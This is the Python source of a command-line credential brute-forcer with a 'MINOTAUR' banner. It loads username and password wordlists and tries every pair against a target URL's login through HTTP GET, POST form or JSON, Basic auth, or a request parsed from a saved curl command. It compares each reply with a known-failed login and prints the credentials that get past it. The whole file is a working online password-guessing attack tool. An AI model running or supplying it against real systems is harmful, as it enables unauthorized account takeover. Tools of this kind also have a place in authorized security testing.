import requests
import argparse
from urllib.parse import urlparse, parse_qsl, urlencode
import sys
import base64
import json
import os
import sys
import re

####################
# global variables #
####################
found = False
mode_list = ["http-get", "http-post", "basic", "requestfile"]
''' For debug
proxies = {
    "http": "http://127.0.0.1:8080"
}
'''

############
# HTTP GET #
############
def httpget_bad_request(url,data,failed_string):

    data = data.replace("^USER^", "input1").replace("^PASS^", "input2")
    
    response = requests.get(url+"?"+data)
    bad_request = {}
    bad_request["status"] = response.status_code
    bad_request["text"] = response.text
    print_bad_request(response)
    if failed_string==None:
        return bad_request
    elif failed_string in response.text:
        return bad_request
    else:
        print("The failed string has not been found inside failed response.")
        print("Failed string : "+str(failed_string))
        exit()

def httpget(url,username,password,bad_request_data,data,bad_string):
    global found 

    data = data.replace("^USER^", username).replace("^PASS^", password)

    response = requests.get(url+"?"+str(data))
    if(response.status_code != bad_request_data["status"]):
        if bad_string==None:
            print(f"\rSUCCESS username: {username} | password: {password}")
            print("Response Body:", response.text)
            found = True
        elif bad_string not in response.text:
            print(f"\rSUCCESS username: {username} | password: {password}")
            print("Response Body:", response.text)
            found = True

#############
# HTTP POST #
#############
def httppost_bad_request(url,data,failed_string):

    filled = data.replace("^USER^", "input1").replace("^PASS^", "input2")

    if is_valid_json(filled):
        headers = {
            "Content-Type": "application/json"
        }
    else:
        headers = {}

    response = requests.post(url, data=filled, headers=headers)
    bad_request = {}
    bad_request["status"] = response.status_code
    bad_request["text"] = response.text
    print_bad_request(response)
    if failed_string==None:
        return bad_request
    elif failed_string in response.text:
        return bad_request
    else:
        print("The failed string has not been found inside failed response.")
        print("Failed string : "+str(failed_string))
        exit()

def httppost(url,username,password,bad_request_data,data,bad_string):
    global found 

    filled = data.replace("^USER^", username).replace("^PASS^", password)
    
    if is_valid_json(filled):
        headers = {
            "Content-Type": "application/json"
        }
    else:
        headers = {}

    response = requests.post(url, data=filled, headers=headers)
    if(response.status_code != bad_request_data["status"]):
        if bad_string==None:
            print(f"\rSUCCESS username: {username} | password: {password}")
            print("Response Body:", response.text)
            found = True
        elif bad_string not in response.text:
            print(f"\rSUCCESS username: {username} | password: {password}")
            print("Response Body:", response.text)
            found = True

#########
# Basic #
#########
def basic_bad_request(url,data,failed_string):

    payload = "input1:input2"
    payload = base64.b64encode(payload.encode()).decode()

    data = dict(parse_qsl(data))
    
    headers = {
        "Authorization" : "Basic "+payload
    }

    response = requests.post(url, json=data, headers=headers)
    bad_request = {}
    bad_request["status"] = response.status_code
    bad_request["text"] = response.text
    print_bad_request(response)
    if failed_string==None:
        return bad_request
    elif failed_string in response.text:
        return bad_request
    else:
        print("The failed string has not been found inside failed response.")
        print("Failed string : "+str(failed_string))
        exit()

def basic(url,username,password,bad_request_data,data,bad_string):
    global found 

    payload = username+":"+password
    payload = base64.b64encode(payload.encode()).decode()

    data = dict(parse_qsl(data))
    
    headers = {
        "Authorization" : "Basic "+payload
    }
    response = requests.post(url, json=data, headers=headers)
    if(response.status_code != bad_request_data["status"]):
        if bad_string==None:
            print(f"\rSUCCESS username: {username} | password: {password}")
            print("Response Body:", response.text)
            found = True
        elif bad_string not in response.text:
            print(f"\rSUCCESS username: {username} | password: {password}")
            print("Response Body:", response.text)
            found = True

################
# Request file #
################
def requestfile_bad_request(url,data,failed_string):

    method = data[0]
    headers = data[1]
    data = data[2]

    url = url.replace("^USER^", "input1").replace("^PASS^", "input2")
    for header in headers:
        headers[header]=headers[header].replace("^USER^", "input1").replace("^PASS^", "input2")
    data = data.replace("^USER^", "input1").replace("^PASS^", "input2")

    response = send_request(url, method, headers, data)

    bad_request = {}
    bad_request["status"] = response.status_code
    bad_request["text"] = response.text
    print_bad_request(response)
    if failed_string==None:
        return bad_request
    elif failed_string in response.text:
        return bad_request
    else:
        print("The failed string has not been found inside failed response.")
        print("Failed string : "+str(failed_string))
        exit()

def requestfile(url,username,password,bad_request_data,data,bad_string):
    global found

    method = data[0]
    headers = data[1]
    data = data[2]

    url = url.replace("^USER^", username).replace("^PASS^", password)
    for header in headers:
        headers[header]=headers[header].replace("^USER^", "input1").replace("^PASS^", "input2")
    data = data.replace("^USER^", username).replace("^PASS^", password)

    response = send_request(url, method, headers, data)

    if(response.status_code != bad_request_data["status"]):
        if bad_string==None:
            print(f"\rSUCCESS username: {username} | password: {password}")
            print("Response Body:", response.text)
            found = True
        elif bad_string not in response.text:
            print(f"\rSUCCESS username: {username} | password: {password}")
            print("Response Body:", response.text)
            found = True

def send_request(url, method, headers, data):
    if method.upper() == "POST":
        response = requests.post(url, headers=headers, data=data)
    elif method.upper() == "GET":
        response = requests.get(url, headers=headers, params=data)
    else:
        raise ValueError(f"Unsupported HTTP method: {method}")
    return response

def parse_curl(curl_command):
    # Extract URL
    url_match = re.search(r"curl '([^']+)'", curl_command)
    url = url_match.group(1) if url_match else None
    
    # Extract method
    method_match = re.search(r"-X (\w+)", curl_command)
    method = method_match.group(1) if method_match else "GET"
    
    # Extract headers
    headers = dict(re.findall(r"-H '([^:]+): ([^']+)'", curl_command))
    
    # Extract data
    data_match = re.search(r"--data-raw '([^']+)'", curl_command)
    data = data_match.group(1) if data_match else None
    
    return url, [method, headers, data]


###################
# Third functions #
###################

def is_valid_json(s):
    try:
        json.loads(s)
        return True
    except json.JSONDecodeError:
        return False

def print_bad_request(response):
    req = response.request
    try:
        req_body = req.body
        json_str = req_body.decode('utf-8')
        req_body = json.loads(json_str)
    except:
        req_body = req.body
    print("  Failed HTTP response status : "+str(response.status_code))
    #print("  Failed HTTP response body : "+response.text)
    print("  Failed HTTP request : ")
    print("  ▀▀▀")
    print(f"  {req.method} {req.url}")
    for i in dict(req.headers):
        print("  "+i+"= "+req.headers[i])
    print("")
    try:
        print("  "+urlencode(req_body))
    except:
        print("  "+req_body)
    print("  ▀▀▀")

def is_valid_url(url: str) -> bool:
    try:
        parsed = urlparse(url)
        return parsed.scheme in ("http", "https") and bool(parsed.netloc)
    except Exception:
        return False

def load_lines(path):
    if os.path.isfile(path):
        with open(path, "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip() and not line.strip().startswith("#")]
    return [path.strip()]
    
def printbanner():
    art = """
▐▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▌
▐███╗   ███╗██╗███╗   ██╗ ██████╗  ▌
▐████╗ ████║██║████╗  ██║██╔═══██╗ ▌
▐██╔████╔██║██║██╔██╗ ██║██║   ██║ ▌
▐██║╚██╔╝██║██║██║╚██╗██║██║   ██║ ▌
▐██║ ╚═╝ ██║██║██║ ╚████║╚██████╔╝ ▌
▐╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝  ▌
▐                                  ▌
▐████████╗ █████╗ ██╗   ██╗██████╗ ▌
▐╚══██╔══╝██╔══██╗██║   ██║██╔══██╗▌
▐   ██║   ███████║██║   ██║██████╔╝▌
▐   ██║   ██╔══██║██║   ██║██╔══██╗▌
▐   ██║   ██║  ██║╚██████╔╝██║  ██║▌
▐   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝▌
▐▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▌
"""
    print(art)


########
# Main #
########
def main(argv=None):
    printbanner()
    global found 
    global mode_list

    if argv is None:
        argv = sys.argv[1:]

    parser = argparse.ArgumentParser(
        description="Example script that accepts host, username file and password file.",
        add_help=False,  # we'll provide a custom --help so we can use -h for host
    )

    parser.add_argument("-h", "--host", dest="host", required=False, default=None,
                        help="Target host URL (e.g. http://example.com)")
    parser.add_argument("-m", "--mode", dest="mode", required=True,
                        help="This is the authentification mode")
    parser.add_argument("-d", "--data", dest="data", required=True,
                        help="This shows how the data is set")
    parser.add_argument("-u", "--user-file", dest="user_file", required=True, 
                        help="Path to username file (one username per line)")
    parser.add_argument("-p", "--pass-file", dest="pass_file", required=True,
                        help="Path to password file (one password per line)")
    parser.add_argument("-f", "--failed-string", dest="failed_string", required=False, default=None,
                        help="Failed string to filter success request")
    args = parser.parse_args(argv)

    # 1. check the mode
    mode = args.mode
    if mode not in mode_list:
        parser.error(f"The mode must be in the following list : "+str(mode))
    data = args.data
    
    # 2. if requestfile, process the file
    if mode == "requestfile":
        if not os.path.isfile(data):
            print("The file provided inside -r is not found")
            exit()
        with open(data, 'r') as f:
            curl_command = f.read()
            host, data = parse_curl(curl_command)
    else:
        host = args.host
        data = args.data
    
    #3. check if host is valid
    if not is_valid_url(host):
        parser.error(f"Invalid host URL: {host}")
    
    #4.start the main process
    failed_string = args.failed_string

    funcs = [httpget, httppost, basic, requestfile]
    funcs_bad_request = [httpget_bad_request ,httppost_bad_request, basic_bad_request, requestfile_bad_request]
    
    mode_index = mode_list.index(mode)

    print("▐▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀")
    print("  URL : "+str(host))
    bad_request_data = funcs_bad_request[mode_index](host,data,failed_string)
    print("▐▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄")
    print("")
    print("▐▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀")

    file_username = load_lines(args.user_file)
    numberusers = len(file_username)
    file_password = load_lines(args.pass_file)
    file_password.append("testtest")
    numberpassword = len(file_password)
    totalnumber = numberusers*numberpassword
    progressvalue = int(totalnumber/100)
    if progressvalue==0:
        progressvalue = 1

    counter = 0
    for user in file_username:
        for password in file_password:
            counter += 1
            if(counter % progressvalue)==0:
                print(f"\r  Progress {counter}/{totalnumber}", end="")
            funcs[mode_index](host,user,password,bad_request_data,data,failed_string)
    print()
    global found 
    if not found:
        print(f"\r  FAILED")

    return 0

if __name__ == "__main__":
    try:
        main()
        print("▐▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄")
    except KeyboardInterrupt:
        print("")
        print("  Program closed")
        print("▐▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄")

